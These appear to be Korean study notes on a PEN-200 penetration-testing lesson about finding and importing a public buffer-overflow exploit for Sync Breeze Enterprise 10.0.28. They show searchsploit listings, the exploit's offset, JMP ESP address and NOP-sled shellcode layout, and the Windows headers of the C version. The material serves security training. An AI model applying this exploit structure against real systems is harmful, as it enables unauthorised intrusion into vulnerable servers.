# 14.1.2 익스플로잇 임포트와 검토

> **Importing and Examining the Exploit** · PEN-200 §14.1.2

- 예제 대상은 Sync Breeze Enterprise 10.0.28. 제품명과 버전으로 검색하면 이 취약점의 공개 익스플로잇 중 하나가 C 로 작성돼 있음 — 그것을 골라 수정 과정을 밟음.

```
kali@kali:~$ searchsploit "Sync Breeze Enterprise 10.0.28"
---------------------------------------------------------------- ---------------------
 Exploit Title                                      |  Path (/usr/share/exploitdb/)
---------------------------------------------------- ---------------------------------
Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC) | windows/dos/43200.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Over | exploits/windows/remote/42928.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Over | exploits/windows/dos/42341.c
```

*searchsploit 로 취약 소프트웨어의 익스플로잇을 찾은 결과 (원문 Listing 296, 표 하단 구분선 생략)*

- 첫 항목 같은 DoS 익스플로잇은 애플리케이션을 죽일 뿐 명시적인 익스플로잇 경로가 없음 — 더 나은 대안이 있으면 피하는 것이 정상임. 뒤 두 항목이 대상임.
- 취약점 위치는 HTTP 서버 모듈이고, POST 요청으로 버퍼 오버플로 조건이 유발됨. Python 판 코드 전체를 읽어보는 것을 권하지만, 핵심 동작은 아래로 요약됨.

```
offset    = "A" * 780
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```

*Sync Breeze 10.0.28 익스플로잇의 핵심 요약 (원문 Listing 297)*

- 읽는 법 — 오프셋 780 지점에서 명령 포인터를 메모리 주소 `0x10090c83` 에 있는 `JMP ESP` 명령으로 덮고, 그 뒤에 NOP 16개를 앞세운 셸코드를 붙임. 완성된 버퍼는 HTTP POST 요청에 실려 나감.
- 이제 Python 같은 스크립트 언어와 C 같은 컴파일 언어의 차이 중 이 작업에 영향을 주는 둘을 봄 — 실행 방식(메모리 관리)과 문자열 연산임.
- 첫째, 스크립트 언어는 인터프리터를 거쳐 실행되며 독립 실행 파일로 컴파일되지 않음. 즉 Python 이 깔려 있지 않은 환경에서는 스크립트를 돌릴 수 없음 — 로컬 권한 상승처럼 대상 환경 안에서 단독으로 돌아야 하는 익스플로잇이 필요할 때 이것이 현장의 제약이 됨. PyInstaller 로 독립 실행 파일로 묶는 대안이 있으나, 익스플로잇 코드의 미묘함을 감안하면 손으로 포팅하는 쪽을 권함.
- 둘째, Python 은 문자열 두 개를 `+` 로 더해 이어붙이는 것이 자연스럽지만 C 에서는 그런 연결이 허용되지 않음. 그래서 C 익스플로잇을 고칠 때는 문자열 처리에 훨씬 더 조심해야 함 — 이 절 이후의 작업이 실제로 그 지점에서 걸림.

```
kali@kali:~$ python
...
>>> string1 = "This is"
>>> string2 = " a test"
>>> string3 = string1 + string2
>>> print(string3)
This is a test
```

*Python 인터프리터에서 `+` 로 문자열을 이어붙인 결과 (원문 Listing 298)*

- 수정을 시작하려면 대상 익스플로잇을 현재 작업 디렉터리로 가져옴. SearchSploit 의 `-m` 미러(복사) 옵션을 씀.

```
kali@kali:~$ searchsploit -m 42341
  Exploit: Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC)
      URL: https://www.exploit-db.com/exploits/42341/
     Path: /usr/share/exploitdb/exploits/windows/dos/42341.c
File Type: C source, UTF-8 Unicode text, with CRLF line terminators
Copied to: /home/kali/42341.c
```

*익스플로잇을 현재 디렉터리로 복사 (원문 Listing 299)*

- 복사한 코드를 열면 컴파일 이전에 이미 한 가지가 보임 — 헤더가 이 코드를 Windows 에서 컴파일할 것으로 전제하고 있음.

```
#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```

*`winsock2.h`·`windows.h` — Windows 전용 헤더 (원문 Listing 300)*

- Windows 에서 컴파일하는 선택지도 있지만, 여기서는 Kali 에서 크로스 컴파일하는 쪽으로 감.
